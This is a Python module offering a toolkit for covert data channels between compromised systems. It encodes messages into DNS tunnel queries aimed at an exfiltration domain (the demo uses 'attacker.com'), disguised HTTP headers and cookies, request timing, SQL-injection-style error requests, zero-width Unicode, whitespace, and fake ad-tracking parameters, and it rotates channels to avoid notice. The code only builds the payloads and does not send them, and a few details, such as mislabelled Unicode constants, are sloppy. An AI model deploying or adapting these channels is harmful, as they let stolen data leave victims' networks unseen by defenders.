"""
Tier 3: Covert Communication Channels
Steganographic communication between compromised systems via multiple channels.
Supports DNS tunneling, HTTP header injection, timing channels, error messages, and more.
"""

import base64
import hashlib
import struct
import time
from enum import Enum
from dataclasses import dataclass
from typing import Optional, Dict, List, Any
import re
import socket


class ChannelType(Enum):
    """Supported covert communication channels."""
    DNS_TUNNEL = "dns_tunnel"
    HTTP_HEADER = "http_header"
    TIMING_CHANNEL = "timing_channel"
    ERROR_MESSAGE = "error_message"
    COOKIE_CHANNEL = "cookie_channel"


@dataclass
class CovertMessage:
    """Encapsulates a covert message with metadata."""
    payload: str
    channel_type: ChannelType
    timestamp: float
    sequence_num: int = 0
    requires_reassembly: bool = False


class CovertChannelBuilder:
    """Builds encoded payloads for various covert communication channels."""

    MAX_LABEL_LENGTH = 63  # DNS label constraint
    MIN_TIMING_INTERVAL_MS = 50

    @staticmethod
    def build_dns_tunnel(data: str, domain: str) -> List[str]:
        """
        Encode data in DNS query subdomains.
        
        Args:
            data: Message to encode
            domain: Base domain for queries (e.g., 'exfil.com')
            
        Returns:
            List of DNS queries with encoded data in subdomains
        """
        # Convert data to binary then base32 for DNS compliance
        data_bytes = data.encode('utf-8')
        encoded = base64.b32encode(data_bytes).decode('ascii').rstrip('=')
        
        # Split into 63-character labels (DNS constraint)
        labels = []
        for i in range(0, len(encoded), CovertChannelBuilder.MAX_LABEL_LENGTH):
            label = encoded[i:i + CovertChannelBuilder.MAX_LABEL_LENGTH].lower()
            labels.append(label)
        
        # Build DNS queries with encoded labels
        queries = []
        for idx, label in enumerate(labels):
            # Add sequence number to maintain order
            query_domain = f"{idx:04d}.{label}.{domain}"
            queries.append(query_domain)
        
        return queries

    @staticmethod
    def build_http_header_channel(data: str, header_name: str = "X-Request-ID") -> Dict[str, str]:
        """
        Encode data in legitimate-looking HTTP headers.
        
        Args:
            data: Message to encode
            header_name: Header to use for encoding
            
        Returns:
            Dictionary of HTTP headers with encoded payload
        """
        # Encode as base64url (URL-safe)
        data_bytes = data.encode('utf-8')
        encoded = base64.urlsafe_b64encode(data_bytes).decode('ascii').rstrip('=')
        
        # Split into header-safe chunks if needed
        headers = {
            header_name: encoded,
            "X-Device-ID": hashlib.md5(f"device_{time.time()}".encode()).hexdigest(),
            "X-Session-Token": hashlib.sha256(f"session_{time.time()}".encode()).hexdigest()[:32],
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
        }
        
        return headers

    @staticmethod
    def build_timing_channel(data: str, base_delay_ms: int = 100) -> List[Dict[str, Any]]:
        """
        Encode bits as request timing (1=delay, 0=no delay).
        
        Args:
            data: Message to encode
            base_delay_ms: Milliseconds to delay for '1' bit
            
        Returns:
            List of timing-encoded requests
        """
        # Convert to binary
        binary_str = ''.join(format(ord(c), '08b') for c in data)
        
        requests = []
        for idx, bit in enumerate(binary_str):
            delay_ms = base_delay_ms if bit == '1' else CovertChannelBuilder.MIN_TIMING_INTERVAL_MS
            
            request = {
                'sequence': idx,
                'bit_value': int(bit),
                'delay_ms': delay_ms,
                'endpoint': f'/api/check?id={idx}',
                'timestamp': time.time()
            }
            requests.append(request)
        
        return requests

    @staticmethod
    def build_error_channel(data: str, endpoint: str) -> List[str]:
        """
        Encode data in error-triggering requests where error responses contain payload.
        
        Args:
            data: Message to encode
            endpoint: Target endpoint
            
        Returns:
            List of error-triggering request payloads
        """
        # Encode data as hex
        hex_data = data.encode('utf-8').hex()
        
        # Create requests that trigger errors with our data
        error_requests = []
        for i in range(0, len(hex_data), 16):
            chunk = hex_data[i:i+16]
            
            # SQL injection-like payload that returns error with our data
            payload = f"' AND (SELECT COUNT(*) FROM information_schema.tables WHERE TABLE_NAME LIKE '{chunk}%') > 0 -- "
            
            error_requests.append({
                'method': 'GET',
                'endpoint': endpoint,
                'params': {'id': payload},
                'sequence': i // 16
            })
        
        return error_requests

    @staticmethod
    def build_cookie_channel(data: str) -> Dict[str, str]:
        """
        Encode data in cookie values that look like session tokens.
        
        Args:
            data: Message to encode
            
        Returns:
            Dictionary of cookies with encoded payload
        """
        # Encode as base64
        data_bytes = data.encode('utf-8')
        encoded = base64.b64encode(data_bytes).decode('ascii')
        
        # Generate fake session ID that contains our data
        fake_session = hashlib.sha256(encoded.encode()).hexdigest()
        
        cookies = {
            'JSESSIONID': fake_session,
            'session_token': encoded,
            'user_id': hashlib.md5(f"user_{time.time()}".encode()).hexdigest(),
            'preferences': base64.b64encode(b'lang=en&theme=dark').decode()
        }
        
        return cookies

    @staticmethod
    def decode_dns_tunnel(queries: List[str], domain: str) -> str:
        """
        Decode DNS tunnel queries back to original data.
        
        Args:
            queries: List of DNS queries from tunnel
            domain: Base domain used
            
        Returns:
            Decoded message
        """
        # Extract labels from queries
        labels = []
        for query in queries:
            # Remove domain suffix
            parts = query.replace(f".{domain}", "").split('.')
            if len(parts) >= 2:
                label = parts[1]
                labels.append(label)
        
        # Sort by sequence number (first part)
        labels.sort(key=lambda x: int(queries[labels.index(x)].split('.')[0]) if queries[labels.index(x)].split('.')[0].isdigit() else 0)
        
        # Concatenate and decode
        encoded = ''.join(labels).upper()
        
        # Add padding for base32
        padding = (8 - len(encoded) % 8) % 8
        encoded += '=' * padding
        
        try:
            decoded = base64.b32decode(encoded).decode('utf-8')
            return decoded
        except Exception:
            return ""

    @staticmethod
    def decode_timing_channel(timings: List[float], threshold_ms: int = 150) -> str:
        """
        Decode timing channel back to original data.
        
        Args:
            timings: List of measured delays in milliseconds
            threshold_ms: Threshold to distinguish 0 from 1
            
        Returns:
            Decoded message
        """
        # Convert timings to bits
        binary_str = ''.join('1' if t >= threshold_ms else '0' for t in timings)
        
        # Convert binary back to ASCII
        decoded = ''
        for i in range(0, len(binary_str), 8):
            byte = binary_str[i:i+8]
            if len(byte) == 8:
                decoded += chr(int(byte, 2))
        
        return decoded


class SteganoEncoder:
    """Encodes data using steganographic techniques."""

    # Unicode zero-width characters for encoding
    ZERO_WIDTH_SPACE = '\u200B'
    ZERO_WIDTH_JOINER = '\u200C'
    ZERO_WIDTH_NON_JOINER = '\u200D'
    ZERO_WIDTH_NO_BREAK_SPACE = '\uFEFF'

    @staticmethod
    def encode_in_whitespace(data: str, cover_text: str) -> str:
        """
        Encode data using tabs and spaces in text.
        
        Args:
            data: Message to encode
            cover_text: Legitimate text to hide data in
            
        Returns:
            Text with hidden data in whitespace
        """
        # Convert data to binary
        binary_str = ''.join(format(ord(c), '08b') for c in data)
        
        # Replace each line ending with tabs/spaces encoding binary
        lines = cover_text.split('\n')
        encoded_lines = []
        
        for line in lines:
            encoded_lines.append(line)
        
        # Append binary data as whitespace at end
        whitespace_encoding = ''
        for bit in binary_str:
            whitespace_encoding += '\t' if bit == '1' else '  '
        
        return '\n'.join(encoded_lines) + whitespace_encoding

    @staticmethod
    def encode_in_unicode(data: str) -> str:
        """
        Encode data using zero-width Unicode characters.
        
        Args:
            data: Message to encode
            
        Returns:
            Text with hidden data in zero-width characters
        """
        # Convert data to binary
        binary_str = ''.join(format(ord(c), '08b') for c in data)
        
        # Map bits to zero-width characters
        encoded = 'Innocent'  # Visible text to hide data in
        
        for bit in binary_str:
            if bit == '0':
                encoded += SteganoEncoder.ZERO_WIDTH_SPACE
            elif bit == '1':
                encoded += SteganoEncoder.ZERO_WIDTH_JOINER
        
        return encoded

    @staticmethod
    def encode_in_url_params(data: str) -> Dict[str, str]:
        """
        Disguise data as tracking parameters.
        
        Args:
            data: Message to encode
            
        Returns:
            Dictionary of URL parameters with encoded payload
        """
        # Encode data in base64
        encoded = base64.b64encode(data.encode()).decode('ascii')
        
        # Distribute across tracking parameters
        tracking_params = {
            'utm_source': 'organic',
            'utm_medium': 'search',
            'utm_campaign': encoded[:20],
            'fbclid': encoded[20:40],
            'gclid': encoded[40:60],
            'msclkid': encoded[60:],
            'utm_content': hashlib.md5(data.encode()).hexdigest(),
            'utm_term': hashlib.sha256(data.encode()).hexdigest()[:20]
        }
        
        return tracking_params

    @staticmethod
    def decode_from_whitespace(encoded_text: str) -> str:
        """
        Decode data hidden in whitespace.
        
        Args:
            encoded_text: Text with hidden data
            
        Returns:
            Decoded message
        """
        # Find trailing whitespace
        lines = encoded_text.split('\n')
        whitespace = lines[-1] if lines else ''
        
        # Convert tabs/spaces to binary
        binary_str = ''
        for i in range(0, len(whitespace), 2):
            chunk = whitespace[i:i+2]
            if '\t' in chunk:
                binary_str += '1'
            else:
                binary_str += '0'
        
        # Convert binary to ASCII
        decoded = ''
        for i in range(0, len(binary_str), 8):
            byte = binary_str[i:i+8]
            if len(byte) == 8:
                decoded += chr(int(byte, 2))
        
        return decoded

    @staticmethod
    def decode_from_unicode(encoded_text: str) -> str:
        """
        Decode data hidden in zero-width Unicode characters.
        
        Args:
            encoded_text: Text with hidden data
            
        Returns:
            Decoded message
        """
        # Extract zero-width characters
        binary_str = ''
        for char in encoded_text:
            if char == SteganoEncoder.ZERO_WIDTH_SPACE:
                binary_str += '0'
            elif char == SteganoEncoder.ZERO_WIDTH_JOINER:
                binary_str += '1'
        
        # Convert binary to ASCII
        decoded = ''
        for i in range(0, len(binary_str), 8):
            byte = binary_str[i:i+8]
            if len(byte) == 8:
                try:
                    decoded += chr(int(byte, 2))
                except ValueError:
                    pass
        
        return decoded


class CovertChannelOrchestrator:
    """Orchestrates multi-channel covert communication."""

    def __init__(self):
        self.active_channels: Dict[str, List[Any]] = {}
        self.message_queue: List[CovertMessage] = []

    def queue_message(self, message: CovertMessage) -> None:
        """Queue a message for transmission via covert channel."""
        self.message_queue.append(message)

    def encode_message(self, data: str, channel_type: ChannelType, **kwargs) -> Any:
        """
        Encode message for specific channel type.
        
        Args:
            data: Message to encode
            channel_type: Type of covert channel
            **kwargs: Channel-specific parameters
            
        Returns:
            Encoded payload for transmission
        """
        if channel_type == ChannelType.DNS_TUNNEL:
            domain = kwargs.get('domain', 'exfil.internal')
            return CovertChannelBuilder.build_dns_tunnel(data, domain)
        
        elif channel_type == ChannelType.HTTP_HEADER:
            header_name = kwargs.get('header_name', 'X-Request-ID')
            return CovertChannelBuilder.build_http_header_channel(data, header_name)
        
        elif channel_type == ChannelType.TIMING_CHANNEL:
            base_delay = kwargs.get('base_delay_ms', 100)
            return CovertChannelBuilder.build_timing_channel(data, base_delay)
        
        elif channel_type == ChannelType.ERROR_MESSAGE:
            endpoint = kwargs.get('endpoint', '/api/search')
            return CovertChannelBuilder.build_error_channel(data, endpoint)
        
        elif channel_type == ChannelType.COOKIE_CHANNEL:
            return CovertChannelBuilder.build_cookie_channel(data)
        
        return None

    def rotate_channel(self) -> ChannelType:
        """Select next covert channel for rotation."""
        channels = list(ChannelType)
        return channels[hash(time.time()) % len(channels)]

    def get_status(self) -> Dict[str, Any]:
        """Get status of covert channels."""
        return {
            'queued_messages': len(self.message_queue),
            'active_channels': len(self.active_channels),
            'channel_types': [ch.value for ch in ChannelType]
        }


if __name__ == "__main__":
    # Example usage
    orchestrator = CovertChannelOrchestrator()
    
    # Test DNS tunnel
    dns_queries = CovertChannelBuilder.build_dns_tunnel(
        "Secret message here",
        "attacker.com"
    )
    print(f"DNS Queries: {dns_queries}")
    
    # Test HTTP headers
    headers = CovertChannelBuilder.build_http_header_channel(
        "Another secret",
        "X-Custom-Header"
    )
    print(f"HTTP Headers: {headers}")
    
    # Test timing channel
    timing = CovertChannelBuilder.build_timing_channel("Timed secret")
    print(f"Timing requests: {len(timing)} requests")
    
    # Test steganography
    stego_unicode = SteganoEncoder.encode_in_unicode("Stego message")
    print(f"Unicode steganography: {repr(stego_unicode)}")
    
    print(f"Orchestrator status: {orchestrator.get_status()}")
